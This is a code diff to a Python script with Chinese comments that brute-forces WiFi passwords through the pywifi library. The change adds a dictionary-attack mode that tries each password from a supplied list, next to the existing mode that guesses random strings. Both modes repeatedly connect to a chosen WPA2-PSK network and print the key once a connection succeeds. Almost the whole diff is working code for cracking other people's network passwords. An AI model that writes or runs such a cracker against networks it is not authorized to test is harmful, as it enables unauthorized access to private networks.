@@ -41,7 +41,7 @@ def wifi_scan():
 
 
 # WIFI破解模块
-def wifi_password_crack(wifi_name, pwd_len):
+def wifi_password_crack(wifi_name, pwd_len, pwd_list):
     # 创建wifi对象
     wifi = pywifi.PyWiFi()
     # 创建网卡对象，为第一个wifi网卡
@@ -62,29 +62,50 @@ def wifi_password_crack(wifi_name, pwd_len):
     profile.akm.append(const.AKM_TYPE_WPA2PSK)
     profile.cipher = const.CIPHER_TYPE_CCMP
     while True:
-        # wifi密码
-        chars = string.digits + string.ascii_letters
-        pwd = ''.join(random.sample(chars * 10, pwd_len))
-        profile.key = pwd
-        # 删除所有wifi连接文件
-        interface.remove_all_network_profiles()
-        # 设置新的wifi连接文件
-        tmp_profile = interface.add_network_profile(profile)
-        # 开始尝试连接
-        print(f'\r正在利用密码 {pwd} 尝试破解 ing...')
-        interface.connect(tmp_profile)
-        time.sleep(5)
-        # if time.time() - start_time < 2:
-        if interface.status() == 4:
-            print(f'\r连接成功！密码为：{pwd}')
-            exit(0)
-            print()
-            # print(start_time)
-            # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）
+        if pwd_list:
+            # wifi密码
+            for pwd in pwd_list:
+                profile.key = pwd
+                # 删除所有wifi连接文件
+                interface.remove_all_network_profiles()
+                # 设置新的wifi连接文件
+                tmp_profile = interface.add_network_profile(profile)
+                # 开始尝试连接
+                print(f'\r正在利用密码 {pwd} 尝试破解 ing...')
+                interface.connect(tmp_profile)
+                time.sleep(5)
+                # if time.time() - start_time < 2:
+                if interface.status() == 4:
+                    print(f'\r连接成功！密码为：{pwd}')
+                    exit(0)
+                    print()
+                    # print(start_time)
+                    # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）
+            print(f'{pwd_list}中，没有合适的密码')
+        else:
+            # wifi密码
+            chars = string.digits + string.ascii_letters
+            pwd = ''.join(random.sample(chars * 10, pwd_len))
+            profile.key = pwd
+            # 删除所有wifi连接文件
+            interface.remove_all_network_profiles()
+            # 设置新的wifi连接文件
+            tmp_profile = interface.add_network_profile(profile)
+            # 开始尝试连接
+            print(f'\r正在利用密码 {pwd} 尝试破解 ing...')
+            interface.connect(tmp_profile)
+            time.sleep(5)
+            # if time.time() - start_time < 2:
+            if interface.status() == 4:
+                print(f'\r连接成功！密码为：{pwd}')
+                exit(0)
+                print()
+                # print(start_time)
+                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）
 
 
 # 主函数
-def pwd4wifi_service(pwd_len):
+def pwd4wifi_service(pwd_len, pwd_list):
     # 退出标致
     exit_flag = 0
     # 目标编号
@@ -129,7 +150,7 @@ def pwd4wifi_service(pwd_len):
             # t2 = threading.Thread(target=wifi_password_crack, args=(wifi_list[target_num][1], pwd_len,))  # target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在
             # t1.start()
             # t2.start()
-            wifi_password_crack(wifi_list[target_num][1], pwd_len)
+            wifi_password_crack(wifi_list[target_num][1], pwd_len, pwd_list)
             print('-' * 38)
             exit_flag = 1
         except Exception as e:
